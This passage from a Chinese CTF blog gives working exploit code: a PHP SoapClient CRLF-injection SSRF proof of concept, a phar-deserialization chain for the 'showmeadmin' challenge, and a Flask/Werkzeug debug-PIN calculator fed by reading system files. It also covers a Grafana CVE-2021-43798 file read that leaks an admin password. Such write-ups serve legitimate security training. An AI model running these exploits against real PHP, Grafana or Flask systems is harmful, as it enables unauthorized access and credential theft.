<h1 id="Soap-SSRF"><a href="#Soap-SSRF" class="headerlink" title="Soap SSRF"></a>Soap SSRF</h1><p>php中有一个SoapClient类，该类的构造函数如下：<br><code>public SoapClient :: SoapClient (mixed $wsdl [,array $options ])</code></p>
<p>第一个参数是用来指明是否是wsdl模式。</p>
<p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</p>
<p>举个简单例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;http://localhost:6666&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;123&quot;</span>));</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">func</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在执行一个SoapClient没有的成员函数时，会自动调用该类的<code>__Call</code>方法，访问如下php文件将会向<code>$target</code>发送一个soap请求，并且uri选项是我们可控的地方。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\14169 &gt; nc -lvvp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [127.0.0.1] from LAPTOP-KU3AQ3O9 [127.0.0.1] 63016</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: localhost:6666</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: PHP-SOAP/7.3.4</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">SOAPAction: <span class="string">&quot;123#func&quot;</span></span><br><span class="line">Content-Length: 367</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> xmlns:ns1=<span class="string">&quot;123&quot;</span> xmlns:xsd=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> xmlns:SOAP-ENC=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> SOAP-ENV:encodingStyle=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:func/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure>
<p>而在SoapClient的参数中还有一个可选项为<code>user_agent</code>，可以自定义发送的soap请求的User-Agent的值。<br>由于<code>user_agent</code>参数可控，结合CRLF注入可以实现发生任意POST报文<br>最后给出wupco师傅的生成任意POST报文的POC：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://123.206.216.198/bbb.php&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;a=b&amp;flag=aaa&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: xxxx=1234&#x27;</span></span><br><span class="line">    );</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&#x27;%0d%0a&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;%26&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="题目名称：showmeadmin"><a href="#题目名称：showmeadmin" class="headerlink" title="题目名称：showmeadmin"></a>题目名称：showmeadmin</h1><p>访问题目直接给出index源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] ?: <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$tmp_name</span>)) &#123;</span><br><span class="line">        <span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title function_ invoke__">upload</span>(<span class="variable">$tmp_name</span>, <span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">uploadImage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&#x27;php&#x27;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>], -<span class="number">3</span>, <span class="number">3</span>) === <span class="string">&#x27;php&#x27;</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以注意到源代码中有一个函数<code>file_get_contents($_GET[&#39;file&#39;])</code>，由于<code>file</code>变量限定首尾必须都是php，于是可以想到通过<code>php://filter</code>伪协议读出 class.php 和 flag.php 源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] === <span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Only localhost admin can get the flag!&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span>.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$tmp_name</span>, <span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;check = <span class="keyword">new</span> <span class="title class_">Check</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;tmp_name = <span class="variable">$tmp_name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uploadImage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">checkName</span>(<span class="variable">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$filepath</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;tmp_name, <span class="variable">$filepath</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Upload success! File is located in &quot;</span> . <span class="variable">$filepath</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Upload fail!&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$filepath</span> = <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&quot;/uploads/&quot;</span> . <span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filepath</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">checkContent</span>(<span class="variable">$filepath</span>)) &#123;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$filepath</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Dangerous file!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$allow_exts</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;allow_exts = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkName</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;/&quot;</span>) !== <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$this</span>-&gt;allow_exts, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkContent</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>), <span class="string">&quot;&lt;?php&quot;</span>) !== <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Q1：如何访问flag.php？</strong><br>本题要获取flag就必须访问flag.php文件，但 flag.php 文件在访问时会验证<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>是否为本地，这种验证ip的方式无法进行伪造，那我们就需要找到一个ssrf的攻击点来进行本地访问</p>
<p><strong>Q2：如何进行ssrf，没有回显怎么办？</strong><br>由前面的介绍很容易想到ssrf的实现方式，就是通过构造SoapClient类来发送任意POST报文，从而访问flag.php，<br>但是发送的报文看不到回显，而这时就要利用本题开启的session，在第一次访问后会将<code>if ($_SERVER[&#39;REMOTE_ADDR&#39;] === &#39;127.0.0.1&#39;)</code>的判断结果存储在<code>$_SESSION[&#39;admin&#39;]</code>中<br>所以我们的思路就是在ssrf的报文中自定义一个<code>PHPSESSID=xxx</code>对flag.php进行访问，再用这个sessionid进行访问就能成功访问到flag.php</p>
<p><strong>Q3：SoapClient类如何访问不存在的方法？</strong><br>soap类进行ssrf需要调用一个不存在的方法，可以发现upload 类的__destruct方法调用了 <code>$this-&gt;check-&gt;checkContent</code>，我们只用把<code>$this-&gt;check</code>控制为soap类即可。</p>
<p>而源码中还有一个上传功能，但限制了后缀和文件内容，无法直接上传webshell<br>结合以上两点，这里能使用的思路就是先上传一个phar文件（改为jpg等合法后缀），再访问phar文件触发反序列化，这个phar的meta-data为一个upload类，这个upload类的成员变量check就是我们定义的soap类</p>
<p>上传了exp.jpg后，通过<code>?file=php://filter/resource=phar://./uploads/exp.jpg/exp.php</code>来访问，从而触发soap类不存在的方法，完成ssrf</p>
<p>下面给出exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1:80&#x27;</span>; </span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=ar&#x27;</span>, </span><br><span class="line">);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;ar\r\n&quot;</span> . <span class="title function_ invoke__">join</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="variable">$headers</span>), <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;123&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$check</span>, <span class="variable">$filename</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>; <span class="variable language_">$this</span>-&gt;check = <span class="variable">$check</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">upload</span>(<span class="variable">$a</span>, <span class="string">&#x27;exp.jpg&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;exp.phar&quot;</span>); <span class="comment">//后缀名必须为phar </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?gml __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$exp</span>); <span class="comment">//将自定义的meta-data存入manifest </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件 //签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); </span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;exp.phar&quot;</span>, <span class="string">&quot;exp.jpg&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>通过php文件生成一个exp.jpg，再构造一个post包来上传exp.jpg文件<br><img src="https://img-blog.csdnimg.cn/34452c94f75d49f3b185121e6c87f7a4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>成功上传后再访问<code>?file=php://filter/resource=phar://./uploads/exp.jpg/exp.php</code>，此时ssrf已经成功，我们只用带着刚刚自定义的sessionid就可以访问flag.php了<br><img src="https://img-blog.csdnimg.cn/dce3d5c7b47b4a3795a3e03d7d897d6e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6350f355a95f421d9d85ebbbfcb96f08.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>phar反序列化 + Soap SSRF + session利用</p>
]]></content>
  </entry>
  <entry>
    <title>XCTF分站赛*CTF2022 - Web</title>
    <url>/2022/04/19/starctf2022/</url>
    <content><![CDATA[<h1 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h1><p><img src="https://img-blog.csdnimg.cn/ecbd495a5ef7471498623528e01579df.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>Grafana是一款用Go语言开发的开源数据可视化工具，可以做数据监控和数据统计，带有告警功能。<br>本题使用的Grafana版本为8.2.6，存在任意文件读取的漏洞（CVE-2021-43798）</p>
<p>由于本题需要登录，首先考虑能不能读取到<code>grafana.ini</code>，获取用户名和密码<br><img src="https://img-blog.csdnimg.cn/2e1eebab9259429e8252c14bbe8aa6d3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在ini文件中搜索得到admin的用户名和密码，成功登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[security]</span><br><span class="line"><span class="comment"># disable creation of admin user on first start of grafana</span></span><br><span class="line">;disable_initial_admin_creation = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># default admin user, created on startup</span></span><br><span class="line">admin_user = admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># default admin password, can be changed before first start of grafana,  or in profile settings</span></span><br><span class="line">admin_password = 5f989714e132c9b04d4807dafeb10ade</span><br><span class="line"></span><br><span class="line"><span class="comment"># used for signing</span></span><br><span class="line">;secret_key = SW2YcwTIb9zpOOhoPsMm</span><br></pre></td></tr></table></figure>



<p>在ini文件中还可以找到使用的数据库为mysql，用户名密码都为grafana</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Either &quot;mysql&quot;, &quot;postgres&quot; or &quot;sqlite3&quot;, it&#x27;s your choice</span></span><br><span class="line">;<span class="built_in">type</span> = mysql</span><br><span class="line">;host = mysql:3306</span><br><span class="line">;name = grafana</span><br><span class="line">;user = grafana</span><br><span class="line"><span class="comment"># If the password contains # or ; you have to wrap it with triple quotes. Ex &quot;&quot;&quot;#password;&quot;&quot;&quot;</span></span><br><span class="line">;password = grafana</span><br></pre></td></tr></table></figure>
<p>连接mysql<br><img src="https://img-blog.csdnimg.cn/f05c20368f5a4cbfa55a2d98e3d09992.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>flag就在数据库中<br><img src="https://img-blog.csdnimg.cn/d0ebc0032b5f4a45ab18660bff83f868.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h1 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h1><p>任意用户名密码登陆后错误路径访问可以看到报错，且还是debug模式，我们可以从中获取python路径，在debug模式中使用控制台需要pin码解锁，于是可以考虑读文件来计算这台设备的pin码<br><img src="https://img-blog.csdnimg.cn/078cea4c12b14fa6a421861201612e42.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>3.8的pin码计算脚本如下，需要以下信息：</p>
<ul>
<li>username，用户名，可以读取<code>/etc/passwd</code>得到</li>
<li>modname，默认值为flask.app</li>
<li>appname，默认值为Flask</li>
<li>moddir，flask库下app.py的绝对路径（报错得到）</li>
<li>uuidnode，当前网络的mac地址的十进制数，通过文件<code>/sys/class/net/eth0/address</code>得到16进制结果，转化为10进制进行计算</li>
<li>machine_id，docker机器id，读取<code>/etc/machine-id</code> ，<code>/proc/sys/kernel/random/boot_id</code> ，<code>/proc/self/cgroup</code>，前两个任选一个与最后一个拼接</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377581187&#x27;</span>,<span class="comment">#  /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;</span><span class="comment">#  /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
<p>而且可以发现在<code>/view?note_id=xxx</code>中存在sql注入，而且可以堆叠注入，于是考虑用<code>load data local infile</code>来读取本地文件的信息存储在表中，再用union select 从表中读取数据</p>
